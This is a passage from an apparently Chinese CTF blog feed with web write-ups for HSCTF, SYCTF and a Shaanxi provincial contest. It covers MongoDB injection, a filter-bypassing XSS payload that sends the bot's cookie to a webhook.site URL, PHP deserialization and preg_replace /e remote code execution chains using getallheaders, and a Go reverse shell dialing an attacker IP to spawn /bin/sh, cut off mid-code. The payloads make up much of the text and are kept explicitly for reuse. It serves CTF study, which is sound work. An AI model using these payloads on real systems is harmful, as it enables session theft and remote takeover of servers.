    <content type="html"><![CDATA[<p>这里的写这个wp的原因是这里有几道题考察的是<code>mongodb</code>的注入   </p><p>(<strong>之前没咋见过，都是做mysql的居多</strong>)  </p><p>之前见过一次还是在  <a href="https://ke1nys.github.io/posts/d27bfad9.html#d3node">d3ctf里面见过</a></p><p><a href="https://www.youtube.com/watch?v=QKZWyWQSPaw">youtube———-wp</a></p><h2 id="mogodb"><a href="#mogodb" class="headerlink" title="mogodb"></a>mogodb</h2><p>这是一个<code>mogodb</code>的查询语句  </p><p><img src="../images/image-20230616202249915.png" alt="image-20230616202249915"></p><p>注入点就在这了</p><p><strong>payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; || this.user===&#x27;</span>a</span><br></pre></td></tr></table></figure><p>这里的引号位置是为了闭合代码中的引号</p><p>因为这里使用了<code>||</code>语句  ,所以说只要存在一个用户名为<code>admin</code>的用户，我们就能成功登录</p><p><strong>这里能成功是因为优先级的问题的</strong>              (<strong>非与或  优先级从大到小</strong>)</p><p>所以说这里会先执行<code>&amp;&amp;</code>   然后返回的结果在于<code>||</code>一起</p><h2 id="fancy-page"><a href="#fancy-page" class="headerlink" title="fancy-page"></a><strong>fancy-page</strong></h2><p>考点 <code>xss</code></p><p>这里很奇怪  (<strong>别的题目可以打通的payload到这就不行了，国外的题好奇怪</strong>)</p><p>而且还有一点就是不能使用国内的<code>vps</code>来弹shell     <strong>只能使用专门接http返回信息的网站来做</strong></p><p><strong>这里的话就记录一下他的payload，下次打国际赛在遇到的时候就拿出来用</strong></p><p><strong>给的源码中就下面的最有用</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> <span class="title class_">Arg</span> &#125; <span class="keyword">from</span> <span class="string">&quot;https://cdn.jsdelivr.net/npm/@vunamhung/arg.js@1.4.0/+esm&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sanitize</span>(<span class="params">content</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> content.<span class="title function_">replace</span>(<span class="regexp">/script|on|iframe|object|embed|cookie/gi</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> title = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;title&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> content = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">display</span>(<span class="params"></span>) &#123;</span><br><span class="line">title.<span class="property">textContent</span> = <span class="title class_">Arg</span>(<span class="string">&quot;title&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">title</span> = <span class="title class_">Arg</span>(<span class="string">&quot;title&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sanitized = <span class="title function_">sanitize</span>(<span class="title class_">Arg</span>(<span class="string">&quot;content&quot;</span>));</span><br><span class="line">content.<span class="property">innerHTML</span> = sanitized;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="title class_">Arg</span>(<span class="string">&quot;background_color&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">color</span> = <span class="title class_">Arg</span>(<span class="string">&quot;color&quot;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">style</span>.<span class="property">fontFamily</span> = <span class="title class_">Arg</span>(<span class="string">&quot;font&quot;</span>);</span><br><span class="line">content.<span class="property">style</span>.<span class="property">fontSize</span> = <span class="title class_">Arg</span>(<span class="string">&quot;font_size&quot;</span>) + <span class="string">&quot;px&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">display</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>虽然过滤了一些标签，但是因为是替换给空，所以可以使用<strong>双写绕过</strong></p><p><img src="../images/image-20230616204154238.png" alt="image-20230616204154238"></p><p><code>content</code> 写<code>xss</code>代码 </p><p><img src="../images/image-20230616204225564.png" alt="image-20230616204225564"></p><p><strong>这里传新生成的页面给机器人访问</strong></p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x oonnerror=<span class="string">&#x27;document.locatioonn=&quot;https://webhook.site/763b1516-a326-4e4e-8327-7954bf30e2da?&quot;+document.ccookieookie&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230616204737798.png" alt="image-20230616204737798"></p><p>成功</p><h2 id="flag-shop"><a href="#flag-shop" class="headerlink" title="flag-shop"></a><strong>flag-shop</strong></h2><p>这是一道<code>mogodb</code>的盲注题目</p><p><img src="../images/image-20230616205615839.png" alt="image-20230616205615839"></p><p><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymongo.errors</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, render_template, request</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = os.getenv(<span class="string">&quot;FLASK_SECRET&quot;</span>)</span><br><span class="line">mongo_client = MongoClient(connect=<span class="literal">False</span>)</span><br><span class="line">db = mongo_client.database</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/search&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line"><span class="keyword">if</span> request.json <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="string">&quot;search&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.json:</span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;No search provided&quot;</span>, <span class="string">&quot;results&quot;</span>: []&#125;), <span class="number">400</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">results = db.flags.find(</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;$where&quot;</span>: <span class="string">f&quot;this.challenge.includes(&#x27;<span class="subst">&#123;request.json[<span class="string">&#x27;search&#x27;</span>]&#125;</span>&#x27;)&quot;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line"><span class="string">&quot;_id&quot;</span>: <span class="literal">False</span>,</span><br><span class="line"><span class="string">&quot;flag&quot;</span>: <span class="literal">False</span></span><br><span class="line">&#125;</span><br><span class="line">).sort(<span class="string">&quot;challenge&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> pymongo.errors.PyMongoError:</span><br><span class="line">traceback.print_exc()</span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Database error&quot;</span>, <span class="string">&quot;results&quot;</span>: []&#125;), <span class="number">500</span></span><br><span class="line"><span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;&quot;</span>, <span class="string">&quot;results&quot;</span>: <span class="built_in">list</span>(results)&#125;), <span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure><p>根据这个代码来看的话</p><p><img src="../images/image-20230616205858592.png" alt="image-20230616205858592"></p><p>这里的话是在<code>challenge</code>  这个表里查数据  </p><p><code>id</code>和<code>flag</code>是不给查的    但是我们可以包含上面的<code>include</code>语句，来重新查一个<code>flag</code>表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;)==this.flag.includes(&#x27;</span>xxx</span><br></pre></td></tr></table></figure><p>xx后面就是想要爆破的字符串了</p><p>这里的话<code>include</code>的话就是  <strong>查找表里是否有相对应的字符串</strong></p><p>例如 <code>flag</code>   随便输入4个字母中的一个  就会将<code>flag</code>给输出出来  这就是<code>include</code>的作用</p><p><img src="../images/image-20230616212203808.png" alt="image-20230616212203808"></p><p>查询成功就会输出全部挑战</p><p><img src="../images/image-20230616212223885.png" alt="image-20230616212223885"></p><p>查询失败就啥也没有</p><p>这里在记录一个<code>ejs3.1.9</code>的漏洞题</p><p><a href="https://blog.maple3142.net/2023/06/12/seetf-2023-writeups/#star-cereal-episode-4-a-new-pigeon">wp1 </a>     <a href="https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/#perfect-product">wp2</a></p><p>下次遇到<code>ejs 3.1.9</code>的题  这里直接秒就行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里的写这个wp的原因是这里有几道题考察的是&lt;code&gt;mongodb&lt;/code&gt;的注入   &lt;/p&gt;
&lt;p&gt;(&lt;strong&gt;之前没咋见过，都是做mysql的居多&lt;/strong&gt;)  &lt;/p&gt;
&lt;p&gt;之前见过一次还是在  &lt;a href=&quot;https://ke1nys</summary>
      
    
    
    
    
    <category term="hsctf-web-2023" scheme="https://ke1nys.github.io/tags/hsctf-web-2023/"/>
    
  </entry>
  
  <entry>
    <title>syctf-web-2023</title>
    <link href="https://ke1nys.github.io/posts/eb3b498d.html"/>
    <id>https://ke1nys.github.io/posts/eb3b498d.html</id>
    <published>2023-06-16T09:47:50.000Z</published>
    <updated>2023-06-16T11:49:04.719Z</updated>
    
    <content type="html"><![CDATA[<h2 id="4号的罗纳尔多"><a href="#4号的罗纳尔多" class="headerlink" title="4号的罗纳尔多"></a>4号的罗纳尔多</h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;VanZZZZY&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/;+/&#x27;</span>,<span class="string">&#x27;VanZZZZY&#x27;</span>,<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[A-Za-z_\(\)]+/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$this</span>-&gt;cmd)))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd.<span class="string">&#x27;givemegirlfriend!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[Oa]:[\d]+|Array|Iterator|Object|List/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;Pochy&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Pochy&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230616180925417.png" alt="image-20230616180925417"></p><p>重点在这个正则这里，这里的话是只能使用字母下划线和括号还有<code>;</code></p><p>那么就可以猜出来这里是考察的使用函数来进行<code>RCE</code></p><p><img src="../images/image-20230616181103226.png" alt="image-20230616181103226"></p><p>这里的话对序列化字符也有限制，就是不能使用<code>O</code>和<code>a</code>打头的，那么就只剩一种了，就是之前<code>ctfshow</code>出的一个题了   就是使用内置类   <strong><code>C</code>打头的</strong>  <a href="https://ke1nys.github.io/posts/28e06bac.html#easy-php">C打头的内置类</a></p><p>(<strong>这里的<code>a</code>打头就是在<code>O</code>打头的基础上加个<code>array()</code>函数而已</strong>)</p><p>还把<code>array</code>打头的类给禁掉了，不过没事</p><p><img src="../images/image-20230616185732553.png" alt="image-20230616185732553"></p><p>这些类都可以使用</p><p>只不过<code>Spl</code>开头的相对于<code>Array</code>打头的多一个<code>push()</code>函数</p><p>所以说先构造一下链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> evil;</span><br><span class="line"><span class="variable">$a</span> -&gt; cmd = <span class="string">&quot;rce&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">SplStack</span>();</span><br><span class="line"><span class="variable">$oa</span> -&gt; <span class="title function_ invoke__">push</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br></pre></td></tr></table></figure><p>链子就构造完成了，但是这个执行命令的时候会有一个麻烦就是</p><p><code>eval($this-&gt;cmd.&#39;givemegirlfriend!&#39;);</code>这个后面会有一个字符串，并且<code>;</code>的会被替换掉，不能使用，所以这里的话就得使用一个新的方法</p><p><code>__HALT_COMPILER()</code>函数来截断后面的非法语句，这个熟悉phar协议的师傅都知道，它是phar文件的文件标识，这个函数会中断php的执行，并且不会检查后面的语句，而exit()这些中断函数即使中断了也会检查后面的php语句，如果报错则会抛出错误，所以这里是不能用exit和die的。</p><p>然后因为这个只能通过函数方法来进行rce,那么这里就有两篇文章专门讲了这个</p><p><a href="https://xz.aliyun.com/t/10780">讲的是使用函数来进行rce</a>     <a href="https://guokeya.github.io/post/tckzWc_Xo/">也是讲的函数RCE</a></p><p><strong>最后的payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> evil;</span><br><span class="line"><span class="variable">$a</span> -&gt; cmd = <span class="string">&quot;eval(end(getallheaders()));__HALT_COMPILER();&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">SplStack</span>();</span><br><span class="line"><span class="variable">$oa</span> -&gt; <span class="title function_ invoke__">push</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//这里话不只有SplStack这个类可以使用，上面图片中含有的类都可以使用</span></span><br></pre></td></tr></table></figure><p><code>getallheaders()</code>这个函数是得在<code>apache</code>服务器下使用的，<code>nginx</code>不行</p><p><img src="../images/image-20230616191354197.png" alt="image-20230616191354197"></p><p>成功执行代码</p><h2 id="Confronting-robot"><a href="#Confronting-robot" class="headerlink" title="Confronting robot"></a>Confronting robot</h2><p><strong>这里的因为没有环境，所以就不复现了</strong></p><p>这题的话是由预期解是<strong>主从复制</strong>   <a href="https://www.kdocs.cn/l/cmbPrknYHg1V">主从复制wp1</a>    <a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&amp;mid=2247493926&amp;idx=1&amp;sn=58a1fa641fddb963c6f1c9e5968a5422&amp;chksm=e8a1caf7dfd643e12e5bc1f434bfae55f53693104f81920dc4ce3d4c534b235add654a083c5e&amp;mpshare=1&amp;scene=23&amp;srcid=0612QirgfrJoQ8N2ZyL6HJTv&amp;sharer_sharetime=1686542128876&amp;sharer_shareid=122e5be9c4961e59957c3603ed41e762#rd">主从复制wp2</a></p><p>非预期1是<strong>日志写入马</strong>    <a href="https://www.cnblogs.com/F12-blog/p/17472787.html">日志写马1</a>   <a href="http://acexze.cn/?post=13">日志写马2</a></p><p>非预期2是修改用户属性    <a href="https://www.cnblogs.com/Aann/p/17473430.html">修改用户属性</a></p><h2 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h2><p>这是题目的项目地址  <a href="https://github.com/thewhitetulip/Tasks-vue/blob/master/db/tasks.go#LL11C6-L11C16">tasks</a></p><p>就是通过审计这个代码来发现漏洞利用点的</p><p><a href="https://www.kdocs.cn/l/cmbPrknYHg1V">wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;4号的罗纳尔多&quot;&gt;&lt;a href=&quot;#4号的罗纳尔多&quot; class=&quot;headerlink&quot; title=&quot;4号的罗纳尔多&quot;&gt;&lt;/a&gt;4号的罗纳尔多&lt;/h2&gt;&lt;p&gt;题目代码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;</summary>
      
    
    
    
    
    <category term="syctf-web-2023" scheme="https://ke1nys.github.io/tags/syctf-web-2023/"/>
    
  </entry>
  
  <entry>
    <title>陕西省赛—web-2023</title>
    <link href="https://ke1nys.github.io/posts/9057bed9.html"/>
    <id>https://ke1nys.github.io/posts/9057bed9.html</id>
    <published>2023-06-11T06:53:06.000Z</published>
    <updated>2023-06-12T06:48:37.940Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_61839115/article/details/131117164">参考文章</a></p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a><strong>ezrce</strong></h2><p>但是只做出了这道题目</p><p><strong>和那个GXYCTF的禁止套娃差不多</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你是谁啊哥们？把钥匙给我！！！！&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$qaq</span>=<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;qaq&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$name</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你是&quot;</span>.<span class="variable">$name</span>.<span class="string">&quot;大人????&lt;br/&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$name1</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/hahaha/e&#x27;</span>,<span class="variable">$qaq</span>,<span class="variable">$name</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;骗我的吧，你明明是    &gt;&gt;&gt;&gt;小小&quot;</span>.<span class="variable">$name1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这就是题目的关键代码了</p><p>这个代码里的正则是关键<code>/hahaha/e</code></p><p>在PHP中，<code>/e</code>是一个正则表达式修饰符，它用于将替换字符串作为可执行的PHP代码进行解释。</p><p><img src="../images/image-20230611150837568.png" alt="image-20230611150837568"></p><p>这里的得到了当前目录下的代码，当我们尝试别的命令执行的时候，发现执行失败，应该是过滤了很多东西了</p><p>这里的话我们就尝试读取一下这个<code>waf.php</code>    </p><p><code>file_get_contents(array_pop(scandir(pos(localeconv()))))</code>利用这个代码读取了·<code>waf.php</code>  这个代码是读取最后一个文件的 当然了<code>index.php</code>也能读取 稍微修改一下这个代码就行了</p><p><strong>waf.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$poc</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|get_defined_vars|getallheaders|next|prev|end|array_reverse|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$poc</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker! you die!&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;666&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$poc</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>几乎过滤掉了所有东西，只能通过函数方法来进行执行</p><p>这里的话参考(禁止套娃)得到了灵感</p><p><img src="../images/image-20230611151932869.png" alt="image-20230611151932869"></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()))</span><br></pre></td></tr></table></figure><p>然后cookie传参就行了 ———&gt;  <code>PHPSESSID=/flag</code></p><p>当然还有另一种方法是我看waf.php里面得出的灵感   就是利用这个函数<code>getallheaders</code></p><p><img src="../images/image-20230611152444467.png" alt="image-20230611152444467"></p><p>就是需要改图片中这几处就行了   <code>PHPSESSID=eval(next(getallheaders()))</code>这个为什么能行了，打印一下<code>getallheaders()</code>这个函数就行了，next的时候就会指向UA头，所以说我们只要控制UA头就能RCE了</p><p><strong>两种方法的区别是</strong></p><ul><li><strong>第一种只能读文件，而且只能猜flag名字</strong></li><li><strong>第二种是能进行rce，能为所欲为</strong></li></ul><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>这道题考察的是go的反弹shell</p><p><img src="../images/image-20230611153330503.png" alt="image-20230611153330503"></p><p>这个玩意没啥用</p><p>查看源码 发现有个路径  </p><p><img src="../images/image-20230611153352953.png" alt="image-20230611153352953"></p><p><img src="../images/image-20230611153437952.png" alt="image-20230611153437952"></p><p>访问后是这样，我们把<code>index</code>改成<code>admin</code>的话</p><p><img src="../images/image-20230611153525037.png" alt="image-20230611153525037"></p><p>得到了用户名和一段编码过的密码  于是尝试破解</p><p><img src="../images/image-20230611153632000.png" alt="image-20230611153632000"></p><p>然后登录</p><p><img src="../images/image-20230611153744386.png" alt="image-20230611153744386"></p><p>让我们上传一个go文件，然后它会帮我们运行</p><p>那么我们就去网上找一个由go的反弹shell的文件，然后拿来上传</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;net&quot;</span></span><br><span class="line">    <span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 连接到攻击者的 IP 地址和端口</span></span><br><span class="line">    conn, err := net.Dial(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;your_ip:9996&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将连接交给 Cmd 对象处理</span></span><br><span class="line">    cmd := exec.Command(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">    cmd.Stdin = conn</span><br><span class="line">    cmd.Stdout = conn</span><br><span class="line">    cmd.Stderr = conn</span><br><span class="line"></span><br><span class="line">    <span 